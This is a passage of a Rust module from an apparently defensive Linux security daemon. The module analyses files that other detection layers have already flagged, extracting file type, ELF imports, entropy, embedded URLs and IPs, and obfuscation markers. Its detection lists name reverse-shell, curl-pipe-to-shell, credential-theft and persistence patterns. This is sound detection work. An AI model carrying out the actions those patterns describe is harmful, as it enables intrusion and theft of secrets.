//! Content analysis of a file that behaviour has already implicated.
//!
//! Every other detection layer in this daemon judges a file by what was *done*
//! with it: a path, a hook, an ancestry. That is deliberate — moat is not an
//! anti-virus and does not scan on write, on exec, or on a timer. But once a
//! chain has reached `high`, the alert says "a binary in /tmp phoned home" and
//! stops exactly where a person starts: *what is in the binary?*
//!
//! This module answers that, and only then. The trigger is a conclusion the
//! correlator already reached (`engine::analyse_chain_artifacts`), never a
//! filesystem event, so the cost is paid once per sequence rather than once per
//! syscall.
//!
//! # What it extracts, and why each fact earns its cost
//!
//! * **type from magic bytes, never the extension.** The dropper in the
//!   2026-09-04 lab run was `~/.cache/.fontconfig-helper`, no extension at all;
//!   an extension is attacker-chosen metadata and reading it would be reading
//!   the attacker's own claim about the file.
//! * **ELF: needed libraries, undefined (imported) symbols, section names,
//!   stripped, static or dynamic.** This is the cheapest possible answer to
//!   "what can this thing do": a 40 KB static stripped ELF whose only imports
//!   are `socket`/`connect`/`execve` is a different object from a dynamically
//!   linked build-tool artefact, and neither the path nor the hash says which
//!   one you are holding.
//! * **scripts: the shebang and the obfuscation vocabulary.** The patterns are
//!   copied from `scanner/moat-scan-npm` rather than shared with it: that
//!   scanner is a standalone Python tool run before install, this runs in the
//!   daemon after the fact, and coupling them would mean one of them cannot
//!   change. When they disagree, `moat-scan-npm` is the authority for package
//!   recipes and this is the authority for a file already on disk.
//! * **URLs, hosts and raw IPv4, with the address ranges classified.** A raw
//!   IP is only interesting once you know it is not `127.0.0.1` or the LAN
//!   printer, and "matched an IP regex" without that classification is the
//!   noisiest thing a scanner can say.
//! * **Shannon entropy over the whole file and per ELF section.** A packed or
//!   encrypted payload reads at 7.5+ bits/byte; ordinary compiled `.text` sits
//!   around 6, and English-ish script text around 4.5. It is one f32 and a
//!   256-bucket histogram, and it is the single fact that separates "a binary"
//!   from "a binary with something hidden in it".
//! * **printable strings**, capped and sanitised, because a person or an agent
//!   reading the bundle wants the C2 string itself, not a count of them.
//!
//! # What it deliberately does not extract
//!
//! No disassembly, no emulation, no unpacking, no decoding of the base64 blobs
//! it finds — those are jobs for the agent that reads the bundle, which can
//! think, and this must stay a fixed-cost pass over a byte buffer. No UTF-16
//! string extraction (a Linux workstation), no IPv6 outside URLs (the
//! false-positive rate against `::` in C++ symbols is absurd), no bare
//! hostnames without a scheme unless they end in one of [`INTERESTING_TLDS`].
//!
//! # The limits, and why they are not optional
//!
//! Findings from here are **evidence, never severity**. Nothing in this module
//! escalates an alert; `scoring.rs` and `chain::escalate` remain the only
//! things that decide how loud a finding is. A content scanner that could
//! promote its own findings is a content scanner that decides its own budget.
//!
//! The guards below exist because this is root code reading attacker-chosen
//! paths:
//!
//! * [`Limits::max_bytes`] — a per-file cap. Skipped files are *reported* as
//!   skipped with the reason, because "moat looked and found nothing" and
//!   "moat never looked" are different sentences and only one of them is true.
//! * [`Analyzer::used_this_hour`] — a per-hour budget that survives a restart
//!   through `state.json`. Without it, a chain that re-fires every few seconds
//!   turns each re-fire into a fresh multi-megabyte read.
//! * a sha256 cache, so the same bytes are never analysed twice.
//! * `/var/lib/moat` is refused outright. moat's own evidence store has already
//!   caused two feedback loops in this project, and an analyser that reads a
//!   quarantined dropper out of the store, writes what it found back into the
//!   store, and is then handed its own output is the third.
//! * `evidence::is_secret_path` is the authority on credentials, and it is
//!   consulted **twice**: once on the path as given, and once on the path the
//!   kernel says the descriptor actually landed on. Checking the string and
//!   then following it is the exact shape of the root file-read escalation
//!   fixed on 2026-09-05, and `util::open_suspect` is used here for the same
//!   reason: `fs::read` follows a symlink, this does not.

use std::collections::BTreeMap;
use std::io::Read;
use std::path::Path;

use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::util;

// --------------------------------------------------------------------- limits

/// Defaults for [`Limits`]. See `config::ContentConfig` for the shipped values;
/// these are the numbers the module falls back to when it is driven directly.
///
/// 8 MiB is [`crate::incident::MAX_BINARY_BYTES`], deliberately. The incident
/// capture already copies and hashes a binary that size on this same thread, so
/// the cap is the one cost this daemon has already accepted rather than a new
/// number argued from nothing. Measured here (release, warm cache): inspecting
/// a 4.9 MB ELF takes 20.5 ms and hashing it 1.8 ms — about 4.4 ms per MB — so
/// a file at the cap costs ~36 ms.
pub const DEFAULT_MAX_BYTES: u64 = 8 * 1024 * 1024;
pub const DEFAULT_PER_HOUR: u32 = 40;

/// Caps on what ends up in the record. These are about the *reader*: a bundle
/// with 4000 strings in it is a bundle nobody reads and an agent context nobody
/// can afford.
const MAX_STRINGS: usize = 40;
const MAX_STRING_LEN: usize = 160;
const MAX_URLS: usize = 24;
const MAX_HOSTS: usize = 24;
const MAX_IMPORTS: usize = 64;
const MAX_NEEDED: usize = 24;
const MAX_SECTIONS: usize = 32;
const MAX_MARKERS: usize = 16;
/// A printable run shorter than this is punctuation, not a string.
const MIN_STRING_RUN: usize = 6;
/// Above this the cache is dropped whole rather than evicted one entry at a
/// time — the same idiom `engine::exec_rarity` uses, for the same reason: a
/// bounded map with no policy is a leak with a long fuse.
const MAX_CACHE: usize = 512;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Limits {
    /// Anything larger is skipped and said to be skipped.
    pub max_bytes: u64,
    /// Analyses allowed per rolling hour.
    pub per_hour: u32,
    /// Path roots that are never read, whatever asks. moat's own state
    /// directory goes here.
    pub deny_roots: Vec<String>,
}

impl Default for Limits {
    fn default() -> Self {
        Limits {
            max_bytes: DEFAULT_MAX_BYTES,
            per_hour: DEFAULT_PER_HOUR,
            deny_roots: vec!["/var/lib/moat".into(), "/var/log/moat".into()],
        }
    }
}

// --------------------------------------------------------------------- record

/// One embedded host or address, with the range it lives in.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Host {
    pub value: String,
    /// `public`, `loopback`, `private`, `link-local`, `cgnat`, `multicast`,
    /// `unspecified`, `broadcast`, or `domain` for a name.
    pub scope: String,
}

/// One obfuscation-vocabulary hit, with the text around it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Marker {
    pub name: String,
    pub sample: String,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Section {
    pub name: String,
    pub size: u64,
    pub entropy: f32,
}

#[derive(Debug, Clone, PartialEq, Default, Serialize, Deserialize)]
pub struct Elf {
    /// `elf32` / `elf64`.
    pub class: String,
    /// `exec`, `dyn` (a PIE or a shared object), `rel`, `core`.
    pub kind: String,
    pub machine: String,
    /// `static` or `dynamic`, decided on PT_INTERP and DT_NEEDED rather than
    /// on the presence of a `.dynamic` section, which a packer can strip.
    pub linkage: String,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub interp: Option<String>,
    pub stripped: bool,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub needed: Vec<String>,
    /// DT_RPATH / DT_RUNPATH. A writable runpath is a library-hijack primitive,
    /// so it is worth the two lines it costs to read.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub runpath: Vec<String>,
    /// Undefined dynamic symbols: what this object asks the loader for.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub imports: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub sections: Vec<Section>,
    /// Structural oddities worth a sentence: UPX magic, missing section
    /// headers, a `.text` that reads as compressed.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub notes: Vec<String>,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct Script {
    pub shebang: String,
    pub interpreter: String,
    pub lines: usize,
    /// A 40 000-character line is minified code or a payload; either way it is
    /// the reason a human reading the file learns nothing.
    pub longest_line: usize,
}

/// What was found in one implicated file.
#[derive(Debug, Clone, PartialEq, Default, Serialize, Deserialize)]
pub struct FileAnalysis {
    /// The path the alert named. Attacker-controlled; fenced everywhere it is
    /// rendered.
    pub path: String,
    /// What the kernel said the descriptor really was, when it differs from
    /// `path`. Present only on a disagreement, which is itself a finding.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub real_path: Option<String>,
    /// Why this file was looked at: `trigger` (a step of a high chain) or
    /// `quarantined`.
    pub role: String,
    pub ts: String,
    #[serde(default, skip_serializing_if = "String::is_empty")]
    pub sha256: String,
    pub bytes: u64,
    /// `elf`, `script`, `archive`, `pe`, `macho`, `text`, `data`, `empty`.
    pub kind: String,
    /// Set when nothing was read, with the reason. Mutually exclusive with the
    /// content fields below.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub skipped: Option<String>,
    /// Shannon entropy over the whole file, bits per byte, 0.0–8.0.
    pub entropy: f32,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub elf: Option<Elf>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub script: Option<Script>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub urls: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub hosts: Vec<Host>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub markers: Vec<Marker>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub strings: Vec<String>,
    /// One or more of the lists above hit its cap.
    #[serde(default)]
    pub truncated: bool,
}

impl FileAnalysis {
    fn skipped(path: &str, role: &str, why: String) -> FileAnalysis {
        FileAnalysis {
            path: path.to_string(),
            role: role.to_string(),
            ts: util::now_rfc3339(),
            kind: "unread".into(),
            skipped: Some(why),
            ..Default::default()
        }
    }

    pub fn to_json(&self) -> Value {
        serde_json::to_value(self).unwrap_or(Value::Null)
    }

    /// The one-line facts this analysis adds to an alert's evidence.
    ///
    /// **Every line is generated here, from classified facts.** The only
    /// attacker-derived text that reaches it is a host or a URL, and that goes
    /// through [`safe`] first: evidence lines are printed to a terminal by
    /// `moatctl show` and rendered by the panel, so an embedded escape sequence
    /// would be a control character in a shell, not merely bad typography. The
    /// full strings, samples and section table stay in the structured record
    /// and are only ever rendered inside a `DATA` fence by `bundle.rs`.
    pub fn evidence(&self) -> Vec<String> {
        let mut out = Vec::new();
        let head = format!("content: {}", safe(&self.path, 120));
        if let Some(why) = &self.skipped {
            out.push(format!("{} — not analysed: {}", head, safe(why, 160)));
            return out;
        }
        let mut first = format!(
            "{} — {}, {} bytes, entropy {:.2}",
            head, self.kind, self.bytes, self.entropy
        );
        if let Some(e) = &self.elf {
            first.push_str(&format!(
                " ({} {}, {}, {})",
                e.class,
                e.kind,
                e.linkage,
                if e.stripped { "stripped" } else { "with symbols" }
            ));
        }
        if let Some(s) = &self.script {
            first.push_str(&format!(" (interpreter {})", safe(&s.interpreter, 60)));
        }
        out.push(first);
        if !self.markers.is_empty() {
            let names: Vec<&str> = self.markers.iter().map(|m| m.name.as_str()).collect();
            out.push(format!("content: obfuscation markers: {}", names.join(", ")));
        }
        // Hosts and URLs are the reason anyone asked for this feature, so they
        // are named rather than counted -- but only a handful, sanitised, with
        // the range classification that makes a bare address mean something.
        let mut named: Vec<String> = Vec::new();
        for u in self.urls.iter().take(3) {
            named.push(safe(u, 100));
        }
        for h in self.hosts.iter().take(3) {
            named.push(format!("{} [{}]", safe(&h.value, 80), h.scope));
        }
        if !named.is_empty() {
            let more = (self.urls.len() + self.hosts.len()).saturating_sub(named.len());
            out.push(format!(
                "content: embedded network references: {}{}",
                named.join(", "),
                if more > 0 {
                    format!(" (+{} more, see bundle.md)", more)
                } else {
                    String::new()
                }
            ));
        }
        if let Some(e) = &self.elf {
            for n in &e.notes {
                out.push(format!("content: {}", safe(n, 160)));
            }
        }
        out
    }
}

// -------------------------------------------------------------------- the gate

/// The budget, the cache, and the guards. One per daemon.
pub struct Analyzer {
    pub limits: Limits,
    /// Start of the rolling hour the counter belongs to, unix seconds.
    hour_start: u64,
    used: u32,
    /// sha256 -> what was found. Held in memory only: `state.json` is rewritten
    /// every 5 s and served to the panel, so parking a few hundred string
    /// samples in it would make the status payload pay for this feature on
    /// every poll. The *counter* is persisted, because a budget that resets on
    /// restart is not a budget; the cache is an optimisation and losing it
    /// costs one re-read.
    cache: BTreeMap<String, FileAnalysis>,
    /// Files skipped because the budget was spent, for `status`.
    pub deferred: u64,
}

impl Analyzer {
    pub fn new(limits: Limits) -> Analyzer {
        Analyzer {
            limits,
            hour_start: 0,
            used: 0,
            cache: BTreeMap::new(),
            deferred: 0,
        }
    }

    /// Restore the counter from `state.json`.
    pub fn restore(&mut self, hour_start: u64, used: u32) {
        self.hour_start = hour_start;
        self.used = used;
    }

    pub fn used_this_hour(&self) -> u32 {
        self.used
    }

    pub fn to_state(&self) -> Value {
        json!({
            "hour_start": self.hour_start,
            "used": self.used,
            "per_hour": self.limits.per_hour,
            "max_bytes": self.limits.max_bytes,
            "cached": self.cache.len(),
            "deferred": self.deferred,
        })
    }

    fn charge(&mut self, now: u64) -> bool {
        // A rolling hour anchored on first use, not on the wall clock: a burst
        // at 10:59 must not get a fresh allowance at 11:00.
        if now.saturating_sub(self.hour_start) >= 3600 {
            self.hour_start = now;
            self.used = 0;
        }
        if self.used >= self.limits.per_hour {
            return false;
        }
        self.used += 1;
        true
    }

    /// Analyse one implicated file.
    ///
    /// `known_sha` is the hash an earlier stage already computed (the incident
    /// snapshot records one for every file it captures). When it is present the
    /// cache can answer before a byte is read; when it is absent the hash comes
    /// from the buffer this function reads anyway, so the file is never walked
    /// twice either way.
    pub fn analyse(
        &mut self,
        path: &str,
        role: &str,
        known_sha: Option<&str>,
        now: u64,
    ) -> FileAnalysis {
        if path.is_empty() {
            return FileAnalysis::skipped(path, role, "no path".into());
        }
        // Guard order matters: the two refusals that are about *what the file
        // is* come before anything that touches the filesystem, so a credential
        // path is never even opened.
        if crate::evidence::is_secret_path(path) {
            return FileAnalysis::skipped(
                path,
                role,
                "credential-shaped path; moat does not read key material".into(),
            );
        }
        if util::under_any(path, &self.limits.deny_roots) {
            return FileAnalysis::skipped(
                path,
                role,
                "inside moat's own evidence store; analysing it would feed moat its own output"
                    .into(),
            );
        }
        if let Some(sha) = known_sha {
            if let Some(hit) = self.cache.get(sha) {
                let mut a = hit.clone();
                a.path = path.to_string();
                a.role = role.to_string();
                a.ts = util::now_rfc3339();
                return a;
            }
        }

        // Open first, then re-run both refusals against what the kernel says we
        // are actually holding. `open_suspect` refuses a symlink at the final
        // component; `/proc/self/fd` closes the symlinked-parent half. Checking
        // the string and then following it is the whole of the 2026-09-05 root
        // file-read bug and it is not being reintroduced here.
        let (f, real) = match util::open_suspect(Path::new(path)) {
            Ok(v) => v,
            Err(why) => return FileAnalysis::skipped(path, role, why),
        };
        let differs = real != path;
        if differs {
            if crate::evidence::is_secret_path(&real) {
                return FileAnalysis::skipped(
                    path,
                    role,
                    format!("it resolved to {}, which is credential material", safe(&real, 160)),
                );
            }
            if util::under_any(&real, &self.limits.deny_roots) {
                return FileAnalysis::skipped(
                    path,
                    role,
                    format!("it resolved to {}, inside moat's own store", safe(&real, 160)),
                );
            }
        }

        let size = f.metadata().map(|m| m.len()).unwrap_or(0);
        if size > self.limits.max_bytes {
            return FileAnalysis::skipped(
                path,
                role,
                format!(
                    "{} bytes, over the {} byte content-analysis cap",
                    size, self.limits.max_bytes
                ),
            );
        }
        if !self.charge(now) {
            self.deferred += 1;
            return FileAnalysis::skipped(
                path,
                role,
                format!(
                    "the hourly content-analysis budget ({}/hour) is spent",
                    self.limits.per_hour
                ),
            );
        }

        // `take` so a file that grows between the stat and the read -- or a
        // /proc-like file whose stat says 0 -- cannot pull an unbounded amount
        // of memory into the daemon.
        let mut buf = Vec::with_capacity(size.min(self.limits.max_bytes) as usize + 1);
        if let Err(e) = f
            .take(self.limits.max_bytes + 1)
            .read_to_end(&mut buf)
        {
            return FileAnalysis::skipped(path, role, format!("read: {}", e));
        }
        if buf.len() as u64 > self.limits.max_bytes {
            return FileAnalysis::skipped(
                path,
                role,
                format!(
                    "grew past the {} byte content-analysis cap while being read",
                    self.limits.max_bytes
                ),
            );
        }

        let sha = match known_sha {
            Some(s) => s.to_string(),
            None => sha256_bytes(&buf),
        };
        if let Some(hit) = self.cache.get(&sha) {
            let mut a = hit.clone();
            a.path = path.to_string();
            a.role = role.to_string();
            a.ts = util::now_rfc3339();
            return a;
        }

        let mut a = inspect(&buf);
        a.path = path.to_string();
        a.real_path = differs.then(|| real.clone());
        a.role = role.to_string();
        a.ts = util::now_rfc3339();
        a.sha256 = sha.clone();

        if self.cache.len() >= MAX_CACHE {
            self.cache.clear();
        }
        self.cache.insert(sha, a.clone());
        a
    }
}

// ------------------------------------------------------------------- inspection

/// Everything that happens once the bytes are in hand. Pure, so the whole
/// vocabulary can be tested without a filesystem.
pub fn inspect(buf: &[u8]) -> FileAnalysis {
    let mut a = FileAnalysis {
        bytes: buf.len() as u64,
        entropy: shannon(buf),
        kind: kind_of(buf).into(),
        ..Default::default()
    };
    if buf.is_empty() {
        return a;
    }

    // The text the string-level rules run over. For a script it is the file;
    // for anything else it is the printable runs, so a marker cannot be
    // assembled out of bytes that were never adjacent in a readable string.
    let strings = printable_runs(buf);
    let text: String = if a.kind == "script" || a.kind == "text" {
        String::from_utf8_lossy(buf).into_owned()
    } else {
        strings.join("\n")
    };

    if a.kind == "elf" {
        a.elf = parse_elf(buf);
    }
    if a.kind == "script" {
        a.script = Some(parse_script(&text));
    }

    a.markers = find_markers(&text);
    let (urls, hosts, truncated) = find_network(&text);
    a.urls = urls;
    a.hosts = hosts;

    // Which strings to keep: the interesting ones first. A stripped ELF has
    // thousands of runs and the first forty are the ELF interpreter and the
    // section names, which say nothing.
    let mut kept: Vec<String> = Vec::new();
    for s in strings.iter().filter(|s| interesting_string(s)) {
        if kept.len() >= MAX_STRINGS {
            break;
        }
        let t = safe(s, MAX_STRING_LEN);
        if !kept.contains(&t) {
            kept.push(t);
        }
    }
    a.truncated = truncated
        || a.markers.len() >= MAX_MARKERS
        || strings.iter().filter(|s| interesting_string(s)).count() > kept.len();
    a.strings = kept;
    a
}

/// File type from magic bytes. The extension is the attacker's claim about the
/// file; this is the file.
pub fn kind_of(buf: &[u8]) -> &'static str {
    if buf.is_empty() {
        return "empty";
    }
    if buf.starts_with(b"\x7fELF") {
        return "elf";
    }
    if buf.starts_with(b"#!") {
        return "script";
    }
    if buf.starts_with(b"MZ") {
        // A PE on a Linux workstation is not a false positive to explain away;
        // it is a cross-platform dropper stage or a wine payload.
        return "pe";
    }
    const MACHO: [&[u8]; 4] = [
        b"\xcf\xfa\xed\xfe",
        b"\xce\xfa\xed\xfe",
        b"\xfe\xed\xfa\xcf",
        b"\xca\xfe\xba\xbe",
    ];
    if MACHO.iter().any(|m| buf.starts_with(m)) {
        return "macho";
    }
    const ARCHIVES: [&[u8]; 8] = [
        b"PK\x03\x04",
        b"\x1f\x8b",
        b"BZh",
        b"\xfd7zXZ\x00",
        b"7z\xbc\xaf\x27\x1c",
        b"Rar!\x1a\x07",
        b"\x28\xb5\x2f\xfd", // zstd
        b"!<arch>\n",
    ];
    if ARCHIVES.iter().any(|m| buf.starts_with(m)) {
        return "archive";
    }
    // POSIX tar keeps its magic 257 bytes in.
    if buf.len() > 262 && &buf[257..262] == b"ustar" {
        return "archive";
    }
    // Everything else is decided by how much of it a person could read. The
    // sample is bounded so this stays O(1) on a 16 MB file.
    let head = &buf[..buf.len().min(8192)];
    let printable = head
        .iter()
        .filter(|b| matches!(**b, 0x09 | 0x0a | 0x0d | 0x20..=0x7e))
        .count();
    if head.contains(&0) {
        return "data";
    }
    if printable * 10 >= head.len() * 9 {
        // A shell script without a shebang, a JSON config, a JS payload.
        if looks_like_code(head) {
            "script"
        } else {
            "text"
        }
    } else {
        "data"
    }
}

fn looks_like_code(head: &[u8]) -> bool {
    let t = String::from_utf8_lossy(head);
    const HINTS: [&str; 10] = [
        "function ", "require(", "import ", "def ", "export ", "const ", "=>", "$(", "&&", "; then",
    ];
    HINTS.iter().filter(|h| t.contains(**h)).count() >= 2
}

/// Shannon entropy in bits per byte.
///
/// The whole point is the contrast: ~4.5 for prose or script text, ~6 for
/// compiled `.text`, 7.5+ for compressed, packed or encrypted bytes. One pass,
/// 256 counters, no allocation.
pub fn shannon(buf: &[u8]) -> f32 {
    if buf.is_empty() {
        return 0.0;
    }
    let mut counts = [0u32; 256];
    for b in buf {
        counts[*b as usize] += 1;
    }
    let n = buf.len() as f32;
    let mut h = 0.0f32;
    for c in counts.iter().filter(|c| **c > 0) {
        let p = *c as f32 / n;
        h -= p * p.log2();
    }
    h
}

/// Printable ASCII runs of at least [`MIN_STRING_RUN`] characters — `strings(1)`
/// without the subprocess.
fn printable_runs(buf: &[u8]) -> Vec<String> {
    let mut out = Vec::new();
    let mut run: Vec<u8> = Vec::new();
    for b in buf {
        if matches!(*b, 0x20..=0x7e) {
            run.push(*b);
        } else {
            if run.len() >= MIN_STRING_RUN {
                out.push(String::from_utf8_lossy(&run).into_owned());
            }
            run.clear();
        }
    }
    if run.len() >= MIN_STRING_RUN {
        out.push(String::from_utf8_lossy(&run).into_owned());
    }
    out
}

/// Is this run worth a line in the bundle?
///
/// Nothing here is a detection; it is a reading order. A stripped dropper has
/// 3000 runs and the ones a person wants are the URLs, the paths, the commands
/// and the base64 — not `GLIBC_2.2.5`.
fn interesting_string(s: &str) -> bool {
    if s.len() < 8 {
        return false;
    }
    const BORING: [&str; 8] = [
        "GLIBC_",
        "GCC: (",
        "__libc",
        "_ITM_",
        "__gmon",
        "GCC_",
        "CXXABI_",
        "GLIBCXX_",
    ];
    if BORING.iter().any(|b| s.starts_with(b)) {
        return false;
    }
    const WANTED: [&str; 16] = [
        "http://", "https://", "ws://", "wss://", "/tmp/", "/dev/shm", "curl ", "wget ", "bash -",
        "sh -c", "chmod ", "crontab", ".ssh", "Authorization", "User-Agent", "password",
    ];
    if WANTED.iter().any(|w| s.contains(w)) {
        return true;
    }
    // A long run with a shape: a path, a dotted name, a base64 blob.
    (s.starts_with('/') && s.len() >= 10)
        || s.contains('.') && s.len() >= 12
        || base64_run(s) >= 40
}

/// Longest run of base64 alphabet in a string. A 400-char one is a payload; a
/// 40-char one is a key, a hash or a token.
fn base64_run(s: &str) -> usize {
    let mut best = 0;
    let mut run = 0;
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=' || c == '_' || c == '-' {
            run += 1;
            best = best.max(run);
        } else {
            run = 0;
        }
    }
    best
}

// -------------------------------------------------------------- the vocabulary

/// Obfuscation vocabulary, **copied** from `scanner/moat-scan-npm` rather than
/// shared with it (that scanner is Python, standalone, and pre-install; this is
/// the daemon, post-hoc). Each entry is (name, needles-all-of).
///
/// Plain substrings, not regexes: moatd has no regex crate and does not need
/// one for this. The cost is a handful of `str::find` passes over at most a few
/// hundred KB of extracted strings, and the false-positive cost is paid by a
/// human reading a bundle, not by an alert firing.
const MARKERS: &[(&str, &[&str])] = &[
    ("decode:atob", &["atob("]),
    ("decode:buffer-base64", &["Buffer.from(", "base64"]),
    ("decode:python-b64", &["b64decode("]),
    ("decode:fromhex", &["fromhex("]),
    ("decode:unhexlify", &["unhexlify("]),
    ("decode:zlib", &["zlib.decompress("]),
    ("decode:gunzip", &["gunzipSync("]),
    ("decode:fromcharcode", &["String.fromCharCode("]),
    ("exec:eval", &["eval("]),
    ("exec:new-function", &["new Function("]),
    ("exec:vm-run", &["runInNewContext("]),
    ("exec:child-process", &["child_process"]),
    ("exec:os-system", &["os.system("]),
    ("exec:subprocess", &["subprocess.Popen("]),
    ("exec:sh-c", &["sh -c"]),
    ("cred:ssh-key", &["id_rsa"]),
    ("cred:npm-token", &["_authToken"]),
    ("cred:aws", &["AWS_SECRET_ACCESS_KEY"]),
    ("cred:env-file", &[".env"]),
    ("persist:crontab", &["crontab"]),
    ("persist:systemd-user", &[".config/systemd/user"]),
    ("persist:shell-rc", &[".bashrc"]),
    ("net:reverse-shell", &["/dev/tcp/"]),
    ("anti:ptrace-check", &["TracerPid"]),
];

/// `curl … | sh`, and the four other shapes of the same idea. Hand-rolled
/// because the vocabulary is small and a regex crate is not worth pulling in
/// for it; the shapes are the ones `moat-scan-npm`'s `SHELL_PIPE_RE` matches.
fn curl_pipe_shell(text: &str) -> Option<String> {
    const FETCH: [&str; 5] = ["curl", "wget", "aria2c", "fetch ", "http "];
    const SHELLS: [&str; 8] = ["sh", "bash", "zsh", "dash", "ash", "python", "perl", "node"];
    for line in text.lines() {
        // Cheap reject first, on bytes and without allocating. On a 5 MB
        // binary this is ~19 000 lines of extracted strings, and lowercasing
        // every one of them to ask a question almost all of them answer "no"
        // was measurably the most expensive thing in the whole pass.
        if !line
            .as_bytes()
            .windows(4)
            .any(|w| w.eq_ignore_ascii_case(b"curl") || w.eq_ignore_ascii_case(b"wget"))
        {
            continue;
        }
        let lower = line.to_ascii_lowercase();
        if !FETCH.iter().any(|f| lower.contains(f)) {
            continue;
        }
        // `curl … | sh` and `curl … | sudo sh`.
        if let Some(bar) = lower.find('|') {
            let after = lower[bar + 1..].trim_start();
            let after = after.strip_prefix("sudo ").unwrap_or(after).trim_start();
            let word = after
                .trim_start_matches("/usr/bin/")
                .trim_start_matches("/bin/")
                .split(|c: char| c.is_whitespace() || c == ';' || c == '&')
                .next()
                .unwrap_or("");
            let word = word.trim_end_matches('3');
            if SHELLS.contains(&word) {
                return Some(line.to_string());
            }
        }
        // `sh -c "$(curl …)"`, `bash <(curl …)`, `eval "$(curl …)"`.
        for form in ["$(curl", "$(wget", "<(curl", "<(wget", "`curl", "`wget"] {
            if lower.contains(form) {
                return Some(line.to_string());
            }
        }
    }
    None
}

fn find_markers(text: &str) -> Vec<Marker> {
    let mut out: Vec<Marker> = Vec::new();
    for (name, needles) in MARKERS {
        if out.len() >= MAX_MARKERS {
            break;
        }
        let Some(at) = text.find(needles[0]) else {
            continue;
        };
        if !needles[1..].iter().all(|n| text.contains(n)) {
            continue;
        }
        out.push(Marker {
            name: (*name).to_string(),
            sample: excerpt(text, at),
        });
    }
    if out.len() < MAX_MARKERS {
        if let Some(line) = curl_pipe_shell(text) {
            out.push(Marker {
                name: "exec:curl-pipe-shell".into(),
                sample: safe(line.trim(), 160),
            });
        }
    }
    // A very long base64 literal is not an obfuscation *verb*, but next to one
    // it is the payload, and on its own in an ELF it is still the most
    // interesting thing in the file.
    if out.len() < MAX_MARKERS {
        if let Some(l) = text.lines().find(|l| base64_run(l) >= 400) {
            out.push(Marker {
                name: "blob:base64-400+".into(),
                sample: safe(l.trim(), 160),
            });
        }
    }
    out
}

/// 60 characters either side of a hit, sanitised.
fn excerpt(text: &str, at: usize) -> String {
    let start = text[..at]
        .char_indices()
        .rev()
        .take(60)
        .last()
        .map(|(i, _)| i)
        .unwrap_or(at);
    let end = text[at..]
        .char_indices()
        .take(120)
        .last()
        .map(|(i, c)| at + i + c.len_utf8())
        .unwrap_or(text.len());
    safe(text[start..end].trim(), 180)
}

// ------------------------------------------------------------------- network

/// Domains worth naming when they appear without a scheme. Deliberately short:
/// a bare-hostname matcher with a full TLD list turns every `install.sh`,
/// `main.rs` and `libfoo.so` into a "domain", and a finding nobody trusts is a
/// finding nobody reads.
const INTERESTING_TLDS: &[&str] = &[
    ".com", ".net", ".org", ".io", ".dev", ".xyz", ".top", ".ru", ".cn", ".cc", ".info", ".biz",
    ".online", ".site", ".shop", ".club", ".pw", ".tk", ".onion",
];

/// Suffixes that look like a TLD and are not. `.sh` is the painful one: it is a
/// real ccTLD *and* the extension on half the scripts on the machine.
const NOT_A_DOMAIN: &[&str] = &[".sh", ".so", ".py", ".js", ".rs", ".md", ".ts", ".pyc"];

fn find_network(text: &str) -> (Vec<String>, Vec<Host>, bool) {
    let mut urls: Vec<String> = Vec::new();
    let mut hosts: Vec<Host> = Vec::new();
    let mut truncated = false;

    const SCHEMES: [&str; 6] = ["http://", "https://", "ws://", "wss://", "ftp://", "tcp://"];
    for (i, _) in text.char_indices() {
        if urls.len() >= MAX_URLS {
            truncated = true;
            break;
        }
        let rest = &text[i..];
        let Some(scheme) = SCHEMES.iter().find(|s| rest.starts_with(**s)) else {
            continue;
        };
        let end = rest
            .find(|c: char| {
                c.is_whitespace() || matches!(c, '"' | '\'' | '`' | '<' | '>' | ')' | '\\' | ',')
            })
            .unwrap_or(rest.len())
            .min(300);
        let url = rest[..end].trim_end_matches(['.', ';', ':']);
        if url.len() <= scheme.len() {
            continue;
        }
        let u = safe(url, 240);
        if !urls.contains(&u) {
            urls.push(u);
        }
        // The host half, so the classification below sees it even when it is a
        // literal address inside a URL.
        let host = url[scheme.len()..]
            .split(['/', '?', '#', ':', '@'])
            .next()
            .unwrap_or("");
        push_host(&mut hosts, host);
    }

    // Bare IPv4 and bare interesting-TLD hostnames.
    for token in text.split(|c: char| {
        !(c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == '_')
    }) {
        if hosts.len() >= MAX_HOSTS {
            truncated = true;
            break;
        }
        if token.len() < 4 || !token.contains('.') {
            continue;
        }
        if ipv4_scope(token).is_some() {
            push_host(&mut hosts, token);
            continue;
        }
        let lower = token.to_ascii_lowercase();
        if NOT_A_DOMAIN.iter().any(|s| lower.ends_with(s)) {
            continue;
        }
        if INTERESTING_TLDS.iter().any(|t| lower.ends_with(t)) && !lower.starts_with('.') {
            push_host(&mut hosts, token);
        }
    }
    (urls, hosts, truncated)
}

fn push_host(hosts: &mut Vec<Host>, raw: &str) {
    if raw.is_empty() || hosts.len() >= MAX_HOSTS {
        return;
    }
    let value = safe(raw, 120);
    if hosts.iter().any(|h| h.value == value) {
        return;
    }
    let scope = ipv4_scope(raw).unwrap_or("domain").to_string();
    hosts.push(Host { value, scope });
}

/// Classify a dotted quad, or `None` if it is not one.
///
/// Classification is the whole value of extracting an address. "This binary
/// contains 192.168.1.14" and "this binary contains 45.9.148.99" are different
